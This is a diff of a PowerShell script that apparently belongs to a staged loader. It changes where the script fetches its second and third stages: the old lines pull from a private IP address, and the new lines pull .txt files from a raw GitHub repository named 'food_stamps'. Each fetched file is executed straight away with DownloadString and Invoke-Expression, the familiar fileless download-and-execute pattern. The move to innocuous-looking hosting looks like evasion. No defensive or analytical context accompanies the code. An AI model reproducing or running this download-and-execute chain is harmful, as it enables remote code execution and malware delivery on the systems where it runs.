@@ -60,13 +60,13 @@ Add-Type $APIs
 
 $InitialDate=Get-Date;
 
-# Now load the content of 2.ps1 inside this function body
-$nextPart1 = "http://192.168.50.86/2.ps1"
+# Now load the content of 2.txt inside this function body
+$nextPart1 = "https://raw.githubusercontent.com/david-zdl/food_stamps/refs/heads/main/2.txt"
 $part2Content = (New-Object Net.WebClient).DownloadString($nextPart1)
 Invoke-Expression $part2Content
 
-# Now load the content of 3.ps1 inside this function body
-$nextPart2 = "http://192.168.50.86/3.ps1"
+# Now load the content of 3.txt inside this function body
+$nextPart2 = "https://raw.githubusercontent.com/david-zdl/food_stamps/refs/heads/main/3.txt"
 $part3Content = (New-Object Net.WebClient).DownloadString($nextPart2)
 Invoke-Expression $part3Content
 
